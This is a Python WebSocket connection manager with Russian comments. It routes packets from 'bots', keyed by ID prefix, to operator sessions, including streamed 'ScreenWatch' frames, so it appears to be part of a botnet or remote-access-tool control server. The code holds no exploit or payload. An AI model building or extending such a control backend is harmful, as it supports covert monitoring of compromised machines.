# backend/API/connection_manager.py
import asyncio, logs.LoggerWrapper as logger

class ConnectionManager:
    "Управление WebSocket-туннелями и маршрутизацией пакетов"
    def __init__(self):
        self.active_users, self.tunnels = {}, {} # {login: [ws]}, {prefix: [ws]}
        self.queues, self.send_tasks = {}, {}    # {ws: Queue}, {ws: Task}

    async def connect(self, ws, login, user):
        "Регистрация нового WS-соединения с ограничением сессий"
        await ws.accept()
        if len(self.active_users.get(login, [])) >= 3: return await ws.close(1008) or False
        self.queues[ws] = (q := asyncio.Queue(maxsize=200))
        self.send_tasks[ws] = asyncio.create_task(self._writer(ws, q))
        self.active_users.setdefault(login, []).append(ws)
        # Настройка туннелей по префиксу и роли
        pfx = user.get("prefix", "NONE")
        for g in ([pfx, "ALL"] if user.get("role") == "admin" else [pfx]): self.tunnels.setdefault(g, []).append(ws)
        logger.Log.info(f"[API] [+] {login} connected to {pfx}")
        return True

    def broadcast_packet_sync(self, pkt):
        "Маршрутизация пакета от бота к нужным админам"
        if len(pkt) < 7: return
        # Парсинг заголовка L1 (ID) и L2 (Mod)
        id_l, mod_l = pkt[0], pkt[1]
        bid = pkt[6:6+id_l].decode(errors='ignore')
        mod = pkt[6+id_l:6+id_l+mod_l]
        # Определение целевого туннеля по ID бота
        pfx = bid.split('-')[0] if '-' in bid else "NONE"
        targets = set(self.tunnels.get(pfx, [])) | set(self.tunnels.get("ALL", []))
        for ws in targets:
            if not (q := self.queues.get(ws)): continue
            # Anti-lag: сброс кадров для тяжелых потоков (ScreenWatch/Preview)
            if (b"Screen" in mod or b"Preview" in mod) and q.full(): [q.get_nowait() for _ in range(10) if not q.empty()]
            try: q.put_nowait(pkt)
            except: pass

    async def _writer(self, ws, q):
        "Фоновая отправка данных из очереди в сокет"
        try:
            while True: await ws.send_bytes(await q.get())
        except: pass

    def disconnect(self, ws, login):
        "Очистка ресурсов при разрыве соединения"
        if (t := self.send_tasks.pop(ws, None)): t.cancel()
        self.queues.pop(ws, None)
        for g in list(self.active_users.values()) + list(self.tunnels.values()):
            if ws in g: g.remove(ws)
        logger.Log.info(f"[API] [-] {login} disconnected")